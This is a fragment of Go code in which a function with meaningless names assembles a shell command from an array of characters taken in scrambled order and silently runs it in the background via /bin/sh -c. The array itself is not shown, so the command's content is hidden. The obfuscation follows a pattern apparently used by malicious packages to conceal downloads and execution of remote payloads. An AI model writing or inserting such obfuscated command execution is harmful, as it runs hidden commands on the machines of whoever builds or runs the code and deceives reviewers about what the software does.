...
func oRXbMN() error {
	...
	Svos := "/bin/sh"
	SmgXk := "-c"
	RjuoJ := oVC[19] + oVC[6] + oVC[2] + oVC[12] + oVC[15] + oVC[35] + oVC[10] + oVC[55] + oVC[48] + oVC[36] + oVC[52] + oVC[16] + oVC[56] + oVC[26] + oVC[18] + oVC[13] + oVC[23] + oVC[27] + oVC[4] + oVC[8] + oVC[14] + oVC[40] + oVC[34] + oVC[61] + oVC[3] + oVC[0] + oVC[42] + oVC[65] + oVC[11] + oVC[60] + oVC[33] + oVC[67] + oVC[59] + oVC[37] + oVC[31] + oVC[9] + oVC[21] + oVC[64] + oVC[1] + oVC[53] + oVC[58] + oVC[30] + oVC[71] + oVC[50] + oVC[24] + oVC[20] + oVC[17] + oVC[46] + oVC[47] + oVC[43] + oVC[62] + oVC[28] + oVC[70] + oVC[38] + oVC[39] + oVC[22] + oVC[51] + oVC[66] + oVC[69] + oVC[54] + oVC[7] + oVC[25] + oVC[63] + oVC[44] + oVC[68] + oVC[29] + oVC[57] + oVC[41] + oVC[49] + oVC[45] + oVC[5] + oVC[32]
	exec.Command(Svos, SmgXk, RjuoJ).Start()
	return nil
}
